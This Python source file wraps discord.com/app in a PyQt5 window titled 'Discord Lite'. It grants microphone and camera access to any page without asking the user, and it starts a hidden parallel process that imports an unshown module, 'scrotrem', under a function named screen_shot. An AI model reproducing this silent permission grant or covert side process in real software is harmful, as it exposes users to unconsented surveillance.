
import sys
import os
from PyQt5.QtCore import *
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
from PyQt5.QtWebEngineWidgets import *
from PyQt5.QtPrintSupport import *
import os
import sys
from PyQt5.QtWebEngineWidgets import QWebEngineView, QWebEnginePage

from multiprocessing import Process


def class_runner():
    class WebEnginePage(QWebEnginePage):
        def __init__(self, *args, **kwargs):
            QWebEnginePage.__init__(self, *args, **kwargs)
            self.featurePermissionRequested.connect(self.onFeaturePermissionRequested)

        def onFeaturePermissionRequested(self, url, feature):
            if feature in (QWebEnginePage.MediaAudioCapture, 
                QWebEnginePage.MediaVideoCapture, 
                QWebEnginePage.MediaAudioVideoCapture):
                self.setFeaturePermission(url, feature, QWebEnginePage.PermissionGrantedByUser)
            else:
                self.setFeaturePermission(url, feature, QWebEnginePage.PermissionDeniedByUser)

    app = QApplication(sys.argv)
    app.setApplicationName("Discord Lite")
    view = QWebEngineView()
    page = WebEnginePage()
    view.setPage(page)
    view.load(QUrl("https://discord.com/app"))
    view.show()
    scriptDir = os.path.dirname(os.path.realpath(__file__))
    app.setWindowIcon(QIcon(scriptDir + os.path.sep + 'logo4.png'))
    app.exec_()

def screen_shot():
    import scrotrem
def runn():
    p1 = Process(target=class_runner) # create a process object p1
    p1.start()                   # starts the process p1
    p2 = Process(target=screen_shot)
    p2.start()
if __name__ == '__main__':
    #freeze_support()
    runn()
